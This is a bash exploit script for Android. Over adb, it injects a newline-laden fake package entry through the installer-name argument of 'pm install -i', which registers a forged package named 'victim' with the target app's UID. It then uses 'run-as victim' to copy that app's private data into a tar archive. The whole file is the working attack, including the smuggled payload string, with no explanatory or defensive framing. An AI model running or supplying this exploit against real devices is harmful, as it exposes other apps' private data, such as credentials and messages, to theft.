#!/bin/bash

if [ -z "$1" ]; then
  echo "Usage: $0 <package-name>"
  exit 1
fi

PACKAGE_NAME=$1

MYUID=$(adb shell pm list packages -U | sed -n "s/^package:$PACKAGE_NAME uid://p")
if [ -z "$MYUID" ]; then
  echo "Failed to get UID for package $PACKAGE_NAME. Ensure the package name is correct and the device is connected."
  exit 1
fi

APK_PATH=$(adb shell pm path $PACKAGE_NAME | sed -n "s/^package://p")
if [ -z "$APK_PATH" ]; then
  echo "Failed to get APK path for package $PACKAGE_NAME. Ensure the package name is correct and the device is connected."
  exit 1
fi

PAYLOAD="@null
victim $MYUID 1 /data/user/0 default:targetSdkVersion=28 none 0 0 1 @null"

INSTALL_RESULT=$(adb shell "pm install -i \"$PAYLOAD\" $APK_PATH")
if [[ $INSTALL_RESULT != *"Success"* ]]; then
  echo "Failed to install APK with payload. Error: $INSTALL_RESULT"
  exit 1
fi

adb shell "run-as victim tar -cf - $PACKAGE_NAME" > "$PACKAGE_NAME.tar"
# if [ $? -ne 0 ]; then
#   echo "Failed to create tar archive for package $PACKAGE_NAME."
#   exit 1
# fi

# Notify the user of completion
echo "Archive created: $PACKAGE_NAME.tar"
